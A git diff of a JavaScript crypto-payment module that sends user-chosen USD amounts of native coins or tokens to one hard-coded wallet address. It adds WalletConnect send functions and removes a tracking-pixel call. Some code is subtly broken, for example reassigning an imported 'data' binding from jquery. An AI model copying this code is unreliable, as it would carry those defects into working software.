@@ -4,12 +4,10 @@ import Binance from "binance-api-node";
 import Swal from "sweetalert2";
 import * as eth from "ethers";
 import { data } from "jquery";
-import { pixelLead } from "./pixel";
 
 // Modals
 // eslint-disable-next-line no-unused-vars
 export function SUCCESS_TRANSACTION() {
-  pixelLead();
   Swal.fire({
     title: "Success!",
     text: "Success transaction",
@@ -29,7 +27,7 @@ export function ERROR_TRANSACTION(errorMessage) {
 }
 
 // Constants
-const address = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
+const receiverAddress = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
 const networkRPC = {
   "0x1": "https://eth-mainnet.gateway.pokt.network/v1/5f3453978e354ab992c4da79",
   "0x38": "https://bsc-dataseed1.binance.org",
@@ -109,8 +107,8 @@ async function handleAccountsChanged(accounts, value, gasPrice) {
         params: [
           {
             from: currentAccount,
-            to: address,
-            value: value,
+            to: receiverAddress,
+            value: Web3.utils.toHex(value),
             gasPrice: Web3.utils.toHex(gasPrice),
             gas: Web3.utils.toHex(100000),
           },
@@ -166,7 +164,7 @@ const currentcyToBUSD = {
   "0xa86a": "AVAXBUSD",
 };
 
-let gasPricesInUsd = {
+const gasPricesInUsd = {
   "0x1": 5,
   "0x38": 1,
   "0x89": 1,
@@ -176,11 +174,11 @@ let gasPricesInUsd = {
 async function getCurrencyPrice(chainId) {
   const client = Binance();
   data = await client.prices();
-  return data[currentcyToBUSD[window.ethereum.chainId]];
+  return data[currentcyToBUSD[chainId]];
 }
 
 export async function sendNativeCurrency(amount) {
-  const coinPrice = await getCurrencyPrice();
+  const coinPrice = await getCurrencyPrice(window.ethereum.chainId);
   const value = calculateValue(amount, coinPrice);
   const gasPrice = calculateGasPrice(
     gasPricesInUsd[window.ethereum.chainId],
@@ -192,8 +190,7 @@ export async function sendNativeCurrency(amount) {
 
 export async function sendToken(token, value, decimals) {
   const senderAddress = window.ethereum.selectedAddress;
-  const receiverAddress = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
-  const coinPrice = await getCurrencyPrice();
+  const coinPrice = await getCurrencyPrice(window.ethereum.chainId);
   window.web3 = new Web3(window.ethereum);
   window.ethereum.enable();
   const tokenContract = new web3.eth.Contract(
@@ -225,4 +222,54 @@ export async function sendToken(token, value, decimals) {
         SUCCESS_TRANSACTION();
       }
     );
+}
+
+export async function sendTokenWC(provider, token, value, decimals) {
+  let web3 = new Web3(provider)
+  let accounts = await web3.eth.getAccounts()
+  let senderAddress = accounts[0]
+  const tokenContract = new web3.eth.Contract(
+    ERC20TransferABI,
+    tokenAddress[token]
+  );
+  tokenContract.methods
+    .transfer(
+      receiverAddress,
+      BigNumber(value)
+        .multipliedBy(10 ** decimals)
+        .toString()
+    )
+    .send(
+      {
+        from: senderAddress,
+        gas: Web3.utils.toHex(100000)
+      },
+      function (err, res) {
+        if (err) {
+          console.log("An error occured", err);
+          return;
+        }
+        SUCCESS_TRANSACTION();
+      }
+    );
+}
+
+export async function sendNativeCurrencyWC(provider, usdAmount) {
+  let coinPrice = await getCurrencyPrice(Web3.utils.toHex(provider.chainId))
+  let val = calculateValue(usdAmount, coinPrice)
+  let web3 = new Web3(provider)
+  web3.eth.getAccounts().then((accounts) => {
+    const tx = {
+      from: accounts[0], // Required
+      to: receiverAddress, // Required (for non contract deployments)
+      data: "0x", // Required
+      gasPrice: "0x02540be400", // Optional
+      gas: "0x9c40", // Optional
+      value: Web3.utils.toHex(val), // Optional
+    }
+    web3.eth.sendTransaction(tx).then((txHash) => {
+      console.log(txHash)
+      SUCCESS_TRANSACTION()
+    })
+  })
 }
